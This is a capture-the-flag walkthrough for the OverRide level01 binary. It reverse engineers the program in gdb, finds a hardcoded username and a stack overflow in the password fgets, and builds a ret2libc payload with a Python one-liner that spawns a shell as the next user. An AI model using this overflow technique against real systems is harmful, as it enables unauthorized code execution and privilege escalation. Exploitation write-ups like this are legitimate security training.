# Walkthrough

After examining the contents of the home directory, a binary file called `"level01"` was discovered. When executed, the program prompts the user to enter a username to connect to the program.

```
level01@OverRide:~$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: samir
verifying username....

nope, incorrect username...
```

To gain a better understanding of the project, I attempted to reverse engineer the program using `gdb`. I started by listing the functions contained in the program and then disassembling the `main` function.

```
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08048318  _init
0x08048360  printf
0x08048360  printf@plt
0x08048370  fgets
0x08048370  fgets@plt
0x08048380  puts
0x08048380  puts@plt
0x08048390  __gmon_start__
0x08048390  __gmon_start__@plt
0x080483a0  __libc_start_main
0x080483a0  __libc_start_main@plt
0x080483b0  _start
0x080483e0  __do_global_dtors_aux
0x08048440  frame_dummy
0x08048464  verify_user_name
0x080484a3  verify_user_pass
0x080484d0  main
0x080485c0  __libc_csu_init
0x08048630  __libc_csu_fini
0x08048632  __i686.get_pc_thunk.bx
0x08048640  __do_global_ctors_aux
0x0804866c  _fini
```

The main function creates a buffer and subsequently clears it. then it prompts the user to enter a username using the fgets function and stores the content in a global variable called "a_user_name."

```c
   0x080484d8 <+8>: sub    esp,0x60
   0x080484db <+11>: lea    ebx,[esp+0x1c]
   0x080484df <+15>: mov    eax,0x0
   0x080484e4 <+20>: mov    edx,0x10
   0x080484e9 <+25>: mov    edi,ebx
   0x080484eb <+27>: mov    ecx,edx
   0x080484ed <+29>: rep stos DWORD PTR es:[edi],eax
   0x080484ef <+31>: mov    DWORD PTR [esp+0x5c],0x0
   0x080484f7 <+39>: mov    DWORD PTR [esp],0x80486b8 // "********* ADMIN LOGIN PROMPT *********"
   0x080484fe <+46>: call   0x8048380 <puts@plt>
   0x08048503 <+51>: mov    eax,0x80486df // "Enter Username: "
   0x08048508 <+56>: mov    DWORD PTR [esp],eax
   0x0804850b <+59>: call   0x8048360 <printf@plt>
   0x08048510 <+64>: mov    eax,ds:0x804a020
   0x08048515 <+69>: mov    DWORD PTR [esp+0x8],eax
   0x08048519 <+73>: mov    DWORD PTR [esp+0x4],0x100
   0x08048521 <+81>: mov    DWORD PTR [esp],0x804a040
   0x08048528 <+88>: call   0x8048370 <fgets@plt>
```

The program then calls the verify_user_name() function, which compares the "a_user_name" variable to a string called "dat_wil" that is no longer than 7 characters using the strncmp function.

```s
(gdb) disas verify_user_name
Dump of assembler code for function verify_user_name:
   0x08048464 <+0>: push   ebp
   0x08048465 <+1>: mov    ebp,esp
   0x08048467 <+3>: push   edi
   0x08048468 <+4>: push   esi
   0x08048469 <+5>: sub    esp,0x10
   0x0804846c <+8>: mov    DWORD PTR [esp],0x8048690
   0x08048473 <+15>: call   0x8048380 <puts@plt>
   0x08048478 <+20>: mov    edx,0x804a040
   0x0804847d <+25>: mov    eax,0x80486a8
   0x08048482 <+30>: mov    ecx,0x7
   0x08048487 <+35>: mov    esi,edx
   0x08048489 <+37>: mov    edi,eax
   0x0804848b <+39>: repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x0804848d <+41>: seta   dl
   0x08048490 <+44>: setb   al
   0x08048493 <+47>: mov    ecx,edx
   0x08048495 <+49>: sub    cl,al
   0x08048497 <+51>: mov    eax,ecx
   0x08048499 <+53>: movsx  eax,al
   0x0804849c <+56>: add    esp,0x10
   0x0804849f <+59>: pop    esi
   0x080484a0 <+60>: pop    edi
   0x080484a1 <+61>: pop    ebp
   0x080484a2 <+62>: ret
```

If the result of the comparison is not equal to 0, the program displays "nope, incorrect username...\n." Otherwise, the program prompts the user to enter a password, which is then stored in a buffer using the fgets function.

```s
   0x08048532 <+98>: mov    DWORD PTR [esp+0x5c],eax
   0x08048536 <+102>: cmp    DWORD PTR [esp+0x5c],0x0
   0x0804853b <+107>: je     0x8048550 <main+128>
   0x0804853d <+109>: mov    DWORD PTR [esp],0x80486f0 // "nope, incorrect username...\n"
   0x08048544 <+116>: call   0x8048380 <puts@plt>
   0x08048549 <+121>: mov    eax,0x1
   0x0804854e <+126>: jmp    0x80485af <main+223>
   0x08048550 <+128>: mov    DWORD PTR [esp],0x804870d // "Enter Password: "
   0x08048557 <+135>: call   0x8048380 <puts@plt>
   0x0804855c <+140>: mov    eax,ds:0x804a020
   0x08048561 <+145>: mov    DWORD PTR [esp+0x8],eax
   0x08048565 <+149>: mov    DWORD PTR [esp+0x4],0x64
   0x0804856d <+157>: lea    eax,[esp+0x1c]
   0x08048571 <+161>: mov    DWORD PTR [esp],eax
   0x08048574 <+164>: call   0x8048370 <fgets@plt>
```

The buffer is then passed as a parameter to the verify_user_pass function, which compares the buffer to the string "admin" that is no longer than 5 characters using the strncmp function.

```s
(gdb) disas verify_user_pass
Dump of assembler code for function verify_user_pass:
   0x080484a3 <+0>: push   ebp
   0x080484a4 <+1>: mov    ebp,esp
   0x080484a6 <+3>: push   edi
   0x080484a7 <+4>: push   esi
   0x080484a8 <+5>: mov    eax,DWORD PTR [ebp+0x8]
   0x080484ab <+8>: mov    edx,eax
   0x080484ad <+10>: mov    eax,0x80486b0
   0x080484b2 <+15>: mov    ecx,0x5
   0x080484b7 <+20>: mov    esi,edx
   0x080484b9 <+22>: mov    edi,eax
   0x080484bb <+24>: repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x080484bd <+26>: seta   dl
   0x080484c0 <+29>: setb   al
   0x080484c3 <+32>: mov    ecx,edx
   0x080484c5 <+34>: sub    cl,al
   0x080484c7 <+36>: mov    eax,ecx
   0x080484c9 <+38>: movsx  eax,al
   0x080484cc <+41>: pop    esi
   0x080484cd <+42>: pop    edi
   0x080484ce <+43>: pop    ebp
   0x080484cf <+44>: ret
```

If the result of the comparison is equal to 0, the program displays "nope, incorrect password...\n." Otherwise, the program outputs the same message.

```s
   0x08048585 <+181>: mov    DWORD PTR [esp+0x5c],eax
   0x08048589 <+185>: cmp    DWORD PTR [esp+0x5c],0x0
   0x0804858e <+190>: je     0x8048597 <main+199>
   0x08048590 <+192>: cmp    DWORD PTR [esp+0x5c],0x0
   0x08048595 <+197>: je     0x80485aa <main+218>
   0x08048597 <+199>: mov    DWORD PTR [esp],0x804871e
   0x0804859e <+206>: call   0x8048380 <puts@plt>
   0x080485a3 <+211>: mov    eax,0x1
   0x080485a8 <+216>: jmp    0x80485af <main+223>
```

Upon analyzing the code, it becomes apparent that the size specified in the second fgets() function, along with the address of esp+0x1c (which points to the buffer), will exceed the address of EBP by 24 bytes. Armed with this knowledge, it is possible to change the return address of the main function to a new address within the system function, while also passing the "/bin/sh" parameter. However, in order to do this, it was necessary to determine the offset between the buffer and the return address. Consequently, I calculated the offset in the following manner:

```sh
>>> (0xffffd6e8 + 0x4) - 0xffffd69c // (EBP + 0x4 <=> return) - address of the buffer
80
```

Next, I needed to locate the address of the system function and determine how to pass the "/bin/sh" parameter to it. To achieve this, I followed these steps:

```s
(gdb) p system
$2 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) info proc mapping
process 1670
Mapped address spaces:

 Start Addr   End Addr       Size     Offset objfile
  0x8048000  0x8049000     0x1000        0x0 /home/users/level01/level01
  0x8049000  0x804a000     0x1000        0x0 /home/users/level01/level01
  0x804a000  0x804b000     0x1000     0x1000 /home/users/level01/level01
 0xf7e2b000 0xf7e2c000     0x1000        0x0
 0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
 0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
 0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
 0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
 0xf7fd0000 0xf7fd4000     0x4000        0x0
 0xf7fd8000 0xf7fdb000     0x3000        0x0
 0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
 0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
 0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
 0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
 0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
0xf7f897ec
1 pattern found.
(gdb)
```

To fill the buffer with the necessary information, I used Python to generate a string consisting of As that would overwrite the return address with the address of the system function. Additionally, I included randomly generated data for the return address of the system() function and the address of the "/bin/sh" parameter.

```sh
level2@RainFall:~$ python2 -c  'print("A" * 80 + "\xf7\xe6\xae\xd0"[::-1] + "BBBB" + "\xf7\xf8\x97\xec"[::-1])' > /tmp/flag
```

Finally, all that remains is to input the "dat_wil" user as the first input, and the previously generated string as the second input. And that's all there is to it!

```sh
level01@OverRide:~$ (echo dat_wil; cat /tmp/flag -) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

whoami
level02
cd ../level02
ls -la
total 21
dr-xr-x---+ 1 level02 level02   80 Sep 13  2016 .
dr-x--x--x  1 root    root     260 Oct  2  2016 ..
-rw-r--r--  1 level02 level02  220 Sep 10  2016 .bash_logout
lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
-rw-r--r--  1 level02 level02 3533 Sep 10  2016 .bashrc
-rwsr-s---+ 1 level03 users   9452 Sep 10  2016 level02
-rw-r--r--+ 1 level02 level02   41 Oct 19  2016 .pass
-rw-r--r--  1 level02 level02  675 Sep 10  2016 .profile
```
